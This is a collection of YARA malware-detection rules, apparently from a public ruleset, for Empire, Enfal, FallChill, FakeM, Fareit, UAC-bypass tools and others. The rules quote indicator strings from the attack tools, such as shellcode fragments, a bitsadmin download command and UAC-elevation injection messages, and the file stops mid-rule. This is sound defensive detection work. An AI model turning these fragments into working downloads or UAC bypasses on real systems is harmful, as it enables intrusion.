Empire_Invoke_Gen {\n   meta:\n      description = \"Detects Empire component - from files Invoke-DCSync.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      super_rule = 1\n      hash1 = \"a3428a7d4f9e677623fadff61b2a37d93461123535755ab0f296aa3b0396eb28\"\n      hash2 = \"61e5ca9c1e8759a78e2c2764169b425b673b500facaca43a26c69ff7e09f62c4\"\n      hash3 = \"eaff29dd0da4ac258d85ecf8b042d73edb01b4db48c68bded2a8b8418dc688b5\"\n   strings:\n      $s1 = \"$Shellcode1 += 0x48\" fullword ascii\n      $s2 = \"$PEHandle = [IntPtr]::Zero\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 3000KB and 1 of them ) or all of them\n}\n\nrule Empire_PowerShell_Framework_Gen5 {\n   meta:\n      description = \"Detects Empire component - from files Invoke-CredentialInjection.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      super_rule = 1\n      hash1 = \"1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8\"\n      hash2 = \"61e5ca9c1e8759a78e2c2764169b425b673b500facaca43a26c69ff7e09f62c4\"\n      hash3 = \"eaff29dd0da4ac258d85ecf8b042d73edb01b4db48c68bded2a8b8418dc688b5\"\n   strings:\n      $s1 = \"if ($ExeArgs -ne $null -and $ExeArgs -ne '')\" fullword ascii\n      $s2 = \"$ExeArgs = \\\"ReflectiveExe $ExeArgs\\\"\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 1000KB and 1 of them ) or all of them\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule EnfalCode : Enfal Family \n{\n    meta:\n        description = \"Enfal code tricks\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-19\"\n        \n    strings:\n        // mov al, 20h; sub al, bl; add [ebx+esi], al; push esi; inc ebx; call edi; cmp ebx, eax\n        $decrypt = { B0 20 2A C3 00 04 33 56 43 FF D7 3B D8 }\n        \n    condition:\n        any of them\n}\n\nrule EnfalStrings : Enfal Family\n{\n    meta:\n        description = \"Enfal Identifying Strings\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-19\"\n        \n    strings:\n        $ = \"D:\\\\work\\\\\\xe6\\xba\\x90\\xe5\\x93\\xa5\\xe5\\x85\\x8d\\xe6\\x9d\\x80\\\\tmp\\\\Release\\\\ServiceDll.pdb\"\n        $ = \"e:\\\\programs\\\\LuridDownLoader\"\n        $ = \"LuridDownloader for Falcon\"\n        $ = \"DllServiceTrojan\"\n        $ = \"\\\\k\\\\\\xe6\\xa1\\x8c\\xe8\\x9d\\xa2\\\\\"\n        $ = \"EtenFalcon\\xef\\xbc\\x88\\xe4\\xbf\\xae\\xe6\\x94\\xb9\\xef\\xbc\\x89\"\n        $ = \"Madonna\\x00Jesus\"\n        $ = \"/iupw82/netstate\"\n        $ = \"fuckNodAgain\"\n        $ = \"iloudermao\"\n        $ = \"Crpq2.cgi\"\n        $ = \"Clnpp5.cgi\"\n        $ = \"Dqpq3ll.cgi\"\n        $ = \"dieosn83.cgi\"\n        $ = \"Rwpq1.cgi\"\n        $ = \"/Ccmwhite\"\n        $ = \"/Cmwhite\"\n        $ = \"/Crpwhite\"\n        $ = \"/Dfwhite\"\n        $ = \"/Query.txt\"\n        $ = \"/Ufwhite\"\n        $ = \"/cgl-bin/Clnpp5.cgi\"\n        $ = \"/cgl-bin/Crpq2.cgi\"\n        $ = \"/cgl-bin/Dwpq3ll.cgi\"\n        $ = \"/cgl-bin/Owpq4.cgi\"\n        $ = \"/cgl-bin/Rwpq1.cgi\"\n        $ = \"/trandocs/mm/\"\n        $ = \"/trandocs/netstat\"\n        $ = \"NFal.exe\"\n        $ = \"LINLINVMAN\"\n        $ = \"7NFP4R9W\"\n        \n    condition:\n        any of them\n}\n\nrule Enfal : Family\n{\n    meta:\n        description = \"Enfal\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-19\"\n        \n    condition:\n        EnfalCode or EnfalStrings\n}\n\n\nrule Enfal_Malware {\n\tmeta:\n\t\tdescription = \"Detects a certain type of Enfal Malware\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"not set\"\n\t\tdate = \"2015/02/10\"\n\t\thash = \"9639ec9aca4011b2724d8e7ddd13db19913e3e16\"\n\t\tscore = 60\n\tstrings:\n\t\t$s0 = \"POWERPNT.exe\" fullword ascii\n\t\t$s1 = \"%APPDATA%\\\\Microsoft\\\\Windows\\\\\" fullword ascii\n\t\t$s2 = \"%HOMEPATH%\" fullword ascii\n\t\t$s3 = \"Server2008\" fullword ascii\n\t\t$s4 = \"Server2003\" fullword ascii\n\t\t$s5 = \"Server2003R2\" fullword ascii\n\t\t$s6 = \"Server2008R2\" fullword ascii\n\t\t$s9 = \"%HOMEDRIVE%\" fullword ascii\n\t\t$s13 = \"%ComSpec%\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule Enfal_Malware_Backdoor {\n\tmeta:\n\t\tdescription = \"Generic Rule to detect the Enfal Malware\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"2015/02/10\"\n\t\tsuper_rule = 1\n\t\thash0 = \"6d484daba3927fc0744b1bbd7981a56ebef95790\"\n\t\thash1 = \"d4071272cc1bf944e3867db299b3f5dce126f82b\"\n\t\thash2 = \"6c7c8b804cc76e2c208c6e3b6453cb134d01fa41\"\n\t\tscore = 60\n\tstrings:\n\t\t$mz = { 4d 5a }\n\t\t\t\n\t\t$x1 = \"Micorsoft Corportation\" fullword wide\n\t\t$x2 = \"IM Monnitor Service\" fullword wide\n\t\t\n\t\t$s1 = \"imemonsvc.dll\" fullword wide\n\t\t$s2 = \"iphlpsvc.tmp\" fullword\n\t\t\n\t\t$z1 = \"urlmon\" fullword\n\t\t$z2 = \"Registered trademarks and service marks are the property of their respec\" wide\t\t\n\t\t$z3 = \"XpsUnregisterServer\" fullword\n\t\t$z4 = \"XpsRegisterServer\" fullword\n\t\t$z5 = \"{53A4988C-F91F-4054-9076-220AC5EC03F3}\" fullword\n\tcondition:\n\t\t( $mz at 0 ) and \n\t\t( \n\t\t\t1 of ($x*) or \n\t\t\t( all of ($s*) and all of ($z*) )\n\t\t)\n}\nrule ce_enfal_cmstar_debug_msg\n{\n    meta:\n        Author      = \"rfalcone\"\n        Date        = \"2015.05.10\"\n        Description = \"Detects the static debug strings within CMSTAR\"\n        Reference   = \"http://researchcenter.paloaltonetworks.com/2015/05/cmstar-downloader-lurid-and-enfals-new-cousin\"\n\n    strings:\n        $d1 = \"EEE\\x0d\\x0a\" fullword\n        $d2 = \"TKE\\x0d\\x0a\" fullword\n        $d3 = \"VPE\\x0d\\x0a\" fullword\n        $d4 = \"VPS\\x0d\\x0a\" fullword\n        $d5 = \"WFSE\\x0d\\x0a\" fullword\n        $d6 = \"WFSS\\x0d\\x0a\" fullword\n        $d7 = \"CM**\\x0d\\x0a\" fullword\n\n    condition:\n        uint16(0) == 0x5a4d and all of ($d*)\n}\n\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nrule Win7Elevatev2 {\n\tmeta:\n\t\tdescription = \"Detects Win7Elevate - Windows UAC bypass utility\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.pretentiousname.com/misc/W7E_Source/Win7Elevate_Inject.cpp.html\"\n\t\tdate = \"2015-05-14\"\n\t\thash1 = \"4f53ff6a04e46eda92b403faf42219a545c06c29\" /* x64 */\n\t\thash2 = \"808d04c187a524db402c5b2be17ce799d2654bd1\" /* x86 */\n\t\tscore = 60\n\tstrings:\n\t\t$x1 = \"This program attempts to bypass Windows 7's default UAC settings to run \" wide\n\t\t$x2 = \"Win7ElevateV2\\\\x64\\\\Release\\\\\" ascii\n\t\t$x3 = \"Run the command normally (without code injection)\" wide\t\n\t\t$x4 = \"Inject file copy && elevate command\" fullword wide\n\t\t$x5 = \"http://www.pretentiousname.com/misc/win7_uac_whitelist2.html\" fullword wide\n\t\t$x6 = \"For injection, pick any unelevated Windows process with ASLR on:\" fullword wide\n\t\t\n\t\t$s1 = \"\\\\cmd.exe\" wide\n\t\t$s2 = \"runas\" wide\n\t\t$s3 = \"explorer.exe\" wide\n\t\t$s4 = \"Couldn't load kernel32.dll\" wide\n\t\t$s5 = \"CRYPTBASE.dll\" wide\n\t\t$s6 = \"shell32.dll\" wide\n\t\t$s7 = \"ShellExecuteEx\" ascii\n\t\t$s8 = \"COMCTL32.dll\" ascii \n\t\t$s9 = \"ShellExecuteEx\" ascii\n\t\t$s10 = \"HeapAlloc\" ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and ( 1 of ($x*) or all of ($s*) )\n}\n\nrule UACME_Akagi {\n\tmeta:\n\t\tdescription = \"Rule to detect UACMe - abusing built-in Windows AutoElevate backdoor\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"https://github.com/hfiref0x/UACME\"\n\t\tdate = \"2015-05-14\"\n\t\thash1 = \"edd2138bbd9e76c343051c6dc898054607f2040a\"\n\t\thash2 = \"e3a919ccc2e759e618208ededa8a543954d49f8a\"\n\t\tscore = 60\n\tstrings:\n\t\t$x1 = \"UACMe injected, Fubuki at your service.\" wide fullword\n\t\t$x3 = \"%temp%\\\\Hibiki.dll\" fullword wide\n\t\t$x4 = \"[UCM] Cannot write to the target process memory.\" fullword wide\n\t\t\n\t\t$s1 = \"%systemroot%\\\\system32\\\\cmd.exe\" wide\n\t\t$s2 = \"D:(A;;GA;;;WD)\" wide\n\t\t$s3 = \"%systemroot%\\\\system32\\\\sysprep\\\\sysprep.exe\" fullword wide\n\t\t$s4 = \"/c wusa %ws /extract:%%windir%%\\\\system32\" fullword wide\n\t\t$s5 = \"Fubuki.dll\" ascii fullword\n\t\t\n\t\t$l1 = \"ntdll.dll\" ascii\n\t\t$l2 = \"Cabinet.dll\" ascii\n\t\t$l3 = \"GetProcessHeap\" ascii\n\t\t$l4 = \"WriteProcessMemory\" ascii\n\t\t$l5 = \"ShellExecuteEx\" ascii\n\tcondition:\n\t\t( 1 of ($x*) ) or ( 3 of ($s*) and all of ($l*) ) \n}\n\nrule UACElevator {\n\tmeta:\n\t\tdescription = \"UACElevator bypassing UAC - file UACElevator.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"https://github.com/MalwareTech/UACElevator\"\n\t\tdate = \"2015-05-14\"\n\t\thash = \"fd29d5a72d7a85b7e9565ed92b4d7a3884defba6\"\n\tstrings:\n\t\t$x1 = \"\\\\UACElevator.pdb\" ascii\n\t\t\n\t\t$s1 = \"%userprofile%\\\\Downloads\\\\dwmapi.dll\" fullword ascii\n\t\t$s2 = \"%windir%\\\\system32\\\\dwmapi.dll\" fullword ascii\n\t\t$s3 = \"Infection module: %s\" fullword ascii\n\t\t$s4 = \"Could not save module to %s\" fullword ascii\n\t\t$s5 = \"%s%s%p%s%ld%s%d%s\" fullword ascii\n\t\t$s6 = \"Stack area around _alloca memory reserved by this function is corrupted\" fullword ascii\n\t\t$s7 = \"Stack around the variable '\" fullword ascii\n\t\t$s8 = \"MSVCR120D.dll\" fullword wide\n\t\t$s9 = \"Address: 0x\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 172KB and \n\t\t\t( $x1 or 8 of ($s*) )\n}\n\nrule s4u {\n\tmeta:\n\t\tdescription = \"Detects s4u executable which allows the creation of a cmd.exe with the context of any user without requiring the password. - file s4u.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"https://github.com/aurel26/s-4-u-for-windows\"\n\t\tdate = \"2015-06-05\"\n\t\thash = \"cfc18f3d5306df208461459a8e667d89ce44ed77\"\n\t\tscore = 50\n\tstrings:\n\t\t// Specific strings (may change)\n\t\t$x0 = \"s4u.exe Domain\\\\Username [Extra SID]\" fullword ascii \n\t\t$x1 = \"\\\\Release\\\\s4u.pdb\" ascii\n\n\t\t// Less specific strings\n\t\t$s0 = \"CreateProcessAsUser failed (error %u).\" fullword ascii \n\t\t$s1 = \"GetTokenInformation failed (error: %u).\" fullword ascii \n\t\t$s2 = \"LsaLogonUser failed (error 0x%x).\" fullword ascii \n\t\t$s3 = \"LsaLogonUser: OK, LogonId: 0x%x-0x%x\" fullword ascii \n\t\t$s4 = \"LookupPrivilegeValue failed (error: %u).\" fullword ascii \n\t\t$s5 = \"The token does not have the specified privilege (%S).\" fullword ascii \n\t\t$s6 = \"Unable to parse command line.\" fullword ascii \n\t\t$s7 = \"Unable to find logon SID.\" fullword ascii \n\t\t$s8 = \"AdjustTokenPrivileges failed (error: %u).\" fullword ascii\n\t\t$s9 = \"AdjustTokenPrivileges (%S): OK\" fullword ascii \n\t\t\n\t\t// Generic\n\t\t$g1 = \"%systemroot%\\\\system32\\\\cmd.exe\" wide\n\t\t$g2 = \"SeTcbPrivilege\" wide\n\t\t$g3 = \"winsta0\\\\default\" wide\n\t\t$g4 = \".rsrc\"\n\t\t$g5 = \"HeapAlloc\"\n\t\t$g6 = \"GetCurrentProcess\"\n\t\t$g7 = \"HeapFree\"\n\t\t$g8 = \"GetProcessHeap\"\n\t\t$g9 = \"ExpandEnvironmentStrings\"\n\t\t$g10 = \"ConvertStringSidToSid\"\n\t\t$g11 = \"LookupPrivilegeValue\"\n\t\t$g12 = \"AllocateLocallyUniqueId\"\n\t\t$g13 = \"ADVAPI32.dll\"\n\t\t$g14 = \"LsaLookupAuthenticationPackage\"\n\t\t$g15 = \"Secur32.dll\"\n\t\t$g16 = \"MSVCR120.dll\"\t\t\n\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 60KB and ( 1 of ($x*) or all of ($s*) or all of ($g*) ) \n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule EzcobStrings : Ezcob Family\n{\n    meta:\n        description = \"Ezcob Identifying Strings\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-23\"\n        \n    strings:\n        $ = \"\\x12F\\x12F\\x129\\x12E\\x12A\\x12E\\x12B\\x12A\\x12-\\x127\\x127\\x128\\x123\\x12\"\n        $ = \"\\x121\\x12D\\x128\\x123\\x12B\\x122\\x12E\\x128\\x12-\\x12B\\x122\\x123\\x12D\\x12\"\n        $ = \"Ezcob\" wide ascii\n        $ = \"l\\x12i\\x12u\\x122\\x120\\x121\\x123\\x120\\x124\\x121\\x126\"\n        $ = \"20110113144935\"\n        \n    condition:\n       any of them\n}\n\nrule Ezcob : Family\n{\n    meta:\n        description = \"Ezcob\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-23\"\n        \n    condition:\n        EzcobStrings\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule ws_f0xy_downloader {\n  meta:\n    description = \"f0xy malware downloader\"\n    author = \"Nick Griffin (Websense)\"\n\n  strings:\n    $mz=\"MZ\"\n    $string1=\"bitsadmin /transfer\"\n    $string2=\"del rm.bat\"\n    $string3=\"av_list=\"\n  \n  condition:\n    ($mz at 0) and (all of ($string*))\n}\n\nrule rc4_stack_key_fallchill\n{\nmeta:\n    description = \"rc4_stack_key\"\n\tref = \"https://www.us-cert.gov/ncas/alerts/TA17-318A\"\nstrings:\n    $stack_key = { 0d 06 09 2a ?? ?? ?? ?? 86 48 86 f7 ?? ?? ?? ?? 0d 01 01 01 ?? ?? ?? ?? 05 00 03 82 41 8b c9 41 8b d1 49 8b 40 08 48 ff c2 88 4c 02 ff ff c1 81 f9 00 01 00 00 7c eb }\ncondition:\n    (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and $stack_key\n}\n\nrule success_fail_codes_fallchill\n{\nmeta:\n    description = \"success_fail_codes\"\n\tref = \"https://www.us-cert.gov/ncas/alerts/TA17-318A\"\nstrings:\n    $s0 = { 68 7a 34 12 00 }  \n    $s1 = { ba 7a 34 12 00 }  \n    $f0 = { 68 5c 34 12 00 }  \n    $f1 = { ba 5c 34 12 00 }\ncondition:\n    (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and (($s0 and $f0) or ($s1 and $f1))\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n*/\n\nrule FUDCrypter\n{\n    meta:\n        description = \"Detects unmodified FUDCrypt samples\"\n        reference = \"https://github.com/gigajew/FudCrypt/\"\n        author = \"https://github.com/hwvs\"\n        last_modified = \"2019-11-21\"\n\n    strings:\n        $ = \"OcYjzPUtJkNbLOABqYvNbvhZf\" wide ascii\n        $ = \"gwiXxyIDDtoYzgMSRGMckRbJi\" wide ascii\n        $ = \"BclWgISTcaGjnwrzSCIuKruKm\" wide ascii\n        $ = \"CJyUSiUNrIVbgksjxpAMUkAJJ\" wide ascii\n        $ = \"fAMVdoPUEyHEWdxQIEJPRYbEN\" wide ascii\n        $ = \"CIGQUctdcUPqUjoucmcoffECY\" wide ascii\n        $ = \"wcZfHOgetgAExzSoWFJFQdAyO\" wide ascii\n        $ = \"DqYKDnIoLeZDWYlQWoxZnpfPR\" wide ascii\n        $ = \"MkhMoOHCbGUMqtnRDJKnBYnOj\" wide ascii\n        $ = \"sHEqLMGglkBAOIUfcSAgMvZfs\" wide ascii\n        $ = \"JtZApJhbFAIFxzHLjjyEQvtgd\" wide ascii\n        $ = \"IIQrSWZEMmoQIKGuxxwoTwXka\" wide ascii\n\n    condition:\n        1 of them\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule HTMLVariant : FakeM Family HTML Variant\n{\n\tmeta:\n\t\tdescription = \"Identifier for html variant of FAKEM\"\n\t\tauthor = \"Katie Kleemola\"\n\t\tlast_updated = \"2014-05-20\"\n\t\n\tstrings:\n\t\t// decryption loop\n\t\t$s1 = { 8B 55 08 B9 00 50 00 00 8D 3D ?? ?? ?? 00 8B F7 AD 33 C2 AB 83 E9 04 85 C9 75 F5 }\n\t\t//mov byte ptr [ebp - x] y, x: 0x10-0x1 y: 0-9,A-F\n\t\t$s2 = { C6 45 F? (3?|4?) }\n\n\tcondition:\n\t\t$s1 and #s2 == 16\n\n}\n\nrule FakeM_Generic {\n\tmeta:\n\t\tdescription = \"Detects FakeM malware samples\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://researchcenter.paloaltonetworks.com/2016/01/scarlet-mimic-years-long-espionage-targets-minority-activists/\"\n\t\tdate = \"2016-01-25\"\n\t\tscore = 85\n\t\thash1 = \"631fc66e57acd52284aba2608e6f31ba19e2807367e33d8704f572f6af6bd9c3\"\n\t\thash2 = \"3d9bd26f5bd5401efa17690357f40054a3d7b438ce8c91367dbf469f0d9bd520\"\n\t\thash3 = \"53af257a42a8f182e97dcbb8d22227c27d654bea756d7f34a80cc7982b70aa60\"\n\t\thash4 = \"4a4dfffae6fc8be77ac9b2c67da547f0d57ffae59e0687a356f5105fdddc88a3\"\n\t\thash5 = \"7bfbf49aa71b8235a16792ef721b7e4195df11cb75371f651595b37690d108c8\"\n\t\thash6 = \"12dedcdda853da9846014186e6b4a5d6a82ba0cf61d7fa4cbe444a010f682b5d\"\n\t\thash7 = \"9adda3d95535c6cf83a1ba08fe83f718f5c722e06d0caff8eab4a564185971c5\"\n\t\thash8 = \"3209ab95ca7ee7d8c0140f95bdb61a37d69810a7a23d90d63ecc69cc8c51db90\"\n\t\thash9 = \"41948c73b776b673f954f497e09cc469d55f27e7b6e19acb41b77f7e64c50a33\"\n\t\thash10 = \"53cecc0d0f6924eacd23c49d0d95a6381834360fbbe2356778feb8dd396d723e\"\n\t\thash11 = \"523ad50b498bfb5ab688d9b1958c8058f905b634befc65e96f9f947e40893e5b\"\n\tstrings:\n\t\t$a1 = \"\\\\system32\\\\kernel32.dll\" fullword ascii\n\t\t$a2 = \"\\\\boot.lnk\" fullword ascii\n\t\t$a3 = \"%USERPROFILE%\" fullword ascii /* Goodware String - occured 16 times */\n\n\t\t$b1 = \"Wizard.EXE\" fullword wide\n\t\t$b2 = \"CommandLineA\" fullword ascii\n\n\t\t$c1 = \"\\\\system32\\\\kernel32.dll\" fullword ascii\n\t\t$c2 = \"\\\\aapz.tmp\" fullword ascii\n\n\t\t$e1 = \"C:\\\\Documents and Settings\\\\A\\\\\" fullword ascii\n\t\t$e2 = \"\\\\svchost.exe\" fullword ascii\n\t\t$e3 = \"\\\\Perform\\\\Release\\\\Perform.pdb\" fullword ascii\n\n\t\t$f1 = \"Browser.EXE\" fullword wide\n\t\t$f2 = \"\\\\browser.exe\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and\n\t\t( all of ($a*) or all of ($b*) or all of ($c*) or all of ($e*) or 1 of ($f*) )\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n*/\n\n/*\n\tYara Rule Set\n\tAuthor: Florian Roth\n\tDate: 2015-10-18\n\tIdentifier: Fareit Oct 2015\n*/\n\nrule Fareit_Trojan_Oct15 {\n\tmeta:\n\t\tdescription = \"Detects Fareit Trojan from Sep/Oct 2015 Wave\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://goo.gl/5VYtlU\"\n\t\tdate = \"2015-10-18\"\n\t\tscore = 80\n\t\tsuper_rule = 1\n\t\thash1 = \"230ca0beba8ae712cfe578d2b8ec9581ce149a62486bef209b04eb11d8c088c3\"\n\t\thash2 = \"3477d6bfd8313d37fedbd3d6ba74681dd7cb59040cabc2991655bdce95a2a997\"\n\t\thash3 = \"408fa0bd4d44de2940605986b554e8dab42f5d28a6a525b4bc41285e37ab488d\"\n\t\thash4 = \"76669cbe6a6aac4aa52dbe9d2e027ba184bf3f0b425f478e8c049637624b5dae\"\n\t\thash5 = \"9486b73eac92497e703615479d52c85cfb772b4ca6c846ef317729910e7c545f\"\n\t\thash6 = \"c3300c648aebac7bf1d90f58ea75660c78604410ca0fa705d3b8ec1e0a45cdd9\"\n\t\thash7 = \"ff83e9fcfdec4ffc748e0095391f84a8064ac958a274b9684a771058c04cb0fa\"\n\tstrings:\n\t\t$s1 = \"ebai.exe\" fullword wide\n\t\t$s2 = \"Origina\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and $s1 in (0..30000) and $s2 in (0..30000)\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule FavoriteCode : Favorite Family \n{\n    meta:\n        description = \"Favorite code features\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-24\"\n    \n    strings:\n        // standard string hiding\n        $ = { C6 45 ?? 3B C6 45 ?? 27 C6 45 ?? 34 C6 45 ?? 75 C6 45 ?? 6B C6 45 ?? 6C C6 45 ?? 3B C6 45 ?? 2F }\n        $ = { C6 45 ?? 6F C6 45 ?? 73 C6 45 ?? 73 C6 45 ?? 76 C6 45 ?? 63 C6 45 ?? 65 C6 45 ?? 78 C6 45 ?? 65 }\n    \n    condition:\n        any of them\n}\n\nrule FavoriteStrings : Favorite Family\n{\n    meta:\n        description = \"Favorite Identifying Strings\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-24\"\n        \n    strings:\n        $string1 = \"!QAZ4rfv\"\n        $file1 = \"msupdater.exe\"\n        $file2 = \"FAVORITES.DAT\"\n        \n    condition:\n       any of ($string*) or all of ($file*)\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\n/*\n\tYara Rule Set\n\tAuthor: YarGen Rule Generator\n\tDate: 2016-07-21\n\tIdentifier: NBXC4L\n\tref = http://pastebin.com/raw/FdrnPwae\n*/\n\n/* Rule Set ----------------------------------------------------------------- */\n\nrule d4fe01ea13cf9926c2cf51d0ffbd78f9a110f4b9 {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file d4fe01ea13cf9926c2cf51d0ffbd78f9a110f4b9.codex\"\n\t\tauthor = \"YarGen Rule Generator\"\n\t\treference = \"not set\"\n\t\tdate = \"2016-07-21\"\n\t\thash1 = \"d1dc9b2905264da34dc97d6c005810fbcc99be1a6b4b41f883bb179dbcacba6e\"\n\tstrings:\n\t\t$s1 = \":&:-:=:J:O:\\\\:m:r:\" fullword ascii\n\t\t$s2 = \"6)6/666;6N6W6^6c6t6y6\" fullword ascii\n\t\t$s3 = \"666Q6V6b6g6~6\" fullword ascii\n\t\t$s4 = \"0%0,010A0F0K0\\\\0a0f0w0|0\" fullword ascii\n\t\t$s5 = \"6!6(63686E6J6W6\\\\6i6n6{6\" fullword ascii\n\t\t$s6 = \"3 3%33383=3J3R3`3e3o3t3~3\" fullword ascii\n\t\t$s7 = \"4 4'40454:4G4M4R4_4e4j4w4\" fullword ascii\n\t\t$s8 = \"1#1(141=1B1N1T1Y1e1k1p1|1\" fullword ascii\n\t\t$s9 = \"?(?2?<?C?J?Q?X?_?f?m?t?{?\" fullword ascii\n\t\t$s10 = \"?#?*?1?8???F?M?T?[?b?i?p?w?\" fullword ascii\n\t\t$s11 = \"6)6/646@6F6K6W6]6b6n6w6|6\" fullword ascii\n\t\t$s12 = \"4#40454:4G4L4Q4^4c4h4u4z4\" fullword ascii\n\t\t$s13 = \"<\\\"<'<3<8<=<I<N<S<_<d<i<u<z<\" fullword ascii\n\t\t$s14 = \">%>/>9>@>G>N>U>\\\\>c>j>q>\" fullword ascii\n\t\t$s15 = \"WTZDAE\" fullword ascii\n\t\t$s16 = \"060>0E0K0P0\\\\0b0g0v0|0\" fullword ascii\n\t\t$s17 = \"4#4-474A4K4U4\\\\4f4p4z4\" fullword ascii\n\t\t$s18 = \"7\\\"7,767@7J7T7^7h7q7{7\" fullword ascii\n\t\t$s19 = \";\\\";';4;E;J;W;k;p;};\" fullword ascii\n\t\t$s20 = \";0;;;F;Q;\\\\;g;r;};\" fullword ascii\n\n\t\t$op0 = { a1 b8 63 44 00 83 c4 14 53 ff 75 14 56 57 ff 90 } /* Opcode */\n\t\t$op1 = { 8b d8 8b 45 08 8b 40 3a 81 c3 00 10 00 00 03 c3 } /* Opcode */\n\t\t$op2 = { 5c 2d 44 00 c7 84 24 c0 } /* Opcode */\n\tcondition:\n\t\t( uint16(0) == 0x5a4d and filesize < 900KB and ( 10 of ($s*) )and 1 of ($op*) ) or ( all of them )\n}\n\nrule sig_7acb8d6d4c062c3097a7d31df103bc4d018519f9 {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file 7acb8d6d4c062c3097a7d31df103bc4d018519f9.codex\"\n\t\tauthor = \"YarGen Rule Generator\"\n\t\treference = \"not set\"\n\t\tdate = \"2016-07-21\"\n\t\thash1 = \"e1607486cbb2d111d5df314fe58948aa0dc5897f56f7fd763c62bb30651380e3\"\n\tstrings:\n\t\t$s1 = \"5(666Z6c6\" fullword ascii\n\t\t$s2 = \"Wlm;y%UD%d\" fullword ascii\n\t\t$s3 = \";1;9;@;G;N;U;\\\\;c;j;q;x;\" fullword ascii\n\t\t$s4 = \"8 8'8.858<8C8J8Q8X8_8f8m8t8\" fullword ascii\n\t\t$s5 = \"2 2,282=2B2G2P2U2Z2_2h2s2x2\" fullword ascii\n\t\t$s6 = \"4'5.555<5C5J5Q5X5_5f5m5t5{5\" fullword ascii\n\t\t$s7 = \"0#0*01080?0F0M0T0[0b0i0p0w0\" fullword ascii\n\t\t$s8 = \"6$6,616=6B6G6S6X6]6i6n6s6\" fullword ascii\n\t\t$s9 = \"=\\\"=)=0=7=>=E=L=S=Z=a=h=\" fullword ascii\n\t\t$s10 = \"6&6-646;6B6I6P6W6^6e6l6s6z6\" fullword ascii\n\t\t$s11 = \"O.QrH@\" fullword ascii\n\t\t$s12 = \">\\\">/>4>A>F>S>X>e>j>w>|>\" fullword ascii\n\t\t$s13 = \"0#0(040=0B0N0T0Y0e0k0p0|0\" fullword ascii\n\t\t$s14 = \"5)5/545@5F5K5W5`5e5q5w5|5\" fullword ascii\n\t\t$s15 = \"=!=&=3=8=E=N=S=`=e=s=x=}=\" fullword ascii\n\t\t$s16 = \":(:/:6:=:D:K:R:Y:`:g:n:u:|:\" fullword ascii\n\t\t$s17 = \"7\\\"727<7F7M7W7a7k7u7\" fullword ascii\n\t\t$s18 = \"2+21262E2K2P2\\\\2h2m2|2\" fullword ascii\n\t\t$s19 = \";/;5;:;G;V;\\\\;a;n;};\" fullword ascii\n\t\t$s20 = \";\\\";-;8;C;N;^;i;t;\" fullword ascii\n\n\t\t$op0 = { ff 44 24 14 8d 47 44 50 a1 08 63 44 00 ff 90 84 } /* Opcode */\n\t\t$op1 = { 6d 43 00 c7 84 24 10 03 00 00 0c 6d 43 00 c7 84 } /* Opcode */\n\t\t$op2 = { c7 43 0c 20 02 00 00 89 5d f0 ff 90 